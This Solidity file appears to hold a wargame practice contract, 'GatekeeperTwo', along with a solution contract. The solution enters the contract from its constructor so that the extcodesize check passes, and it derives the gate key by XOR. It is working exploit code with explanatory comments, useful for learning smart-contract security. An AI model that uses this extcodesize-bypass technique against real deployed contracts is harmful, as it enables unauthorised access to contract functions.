// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                uint64(_gateKey) ==
                type(uint64).max
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

// GatekeeperTwo Hack Contract
contract GatekeeperTwoHack {
    constructor(address _gatekeeperTwo) {
        // In the constructor, we call the enter function of the GatekeeperTwo contract
        // because the codesize at constructor is 0, the modifier gateTwo will pass
        GatekeeperTwo gatekeeperTwo = GatekeeperTwo(_gatekeeperTwo);
        bytes8 gateKey;

        uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));

        // max = 11..11
        // s ^ gateKey = max
        // s ^ s ^ gateKey = gateKey = s ^ max

        // a = 1010
        // b = 1100
        // a ^ b = 0110

        // a ^ a ^ b = b
        // 0 ^ b = b

        // a = 1010
        // a = 1010
        // a ^ a = 0000

        uint64 k = s ^ type(uint64).max;
        gateKey = bytes8(k);

        require(gatekeeperTwo.enter(gateKey), "GatekeeperTwo: failed to enter");
    }
}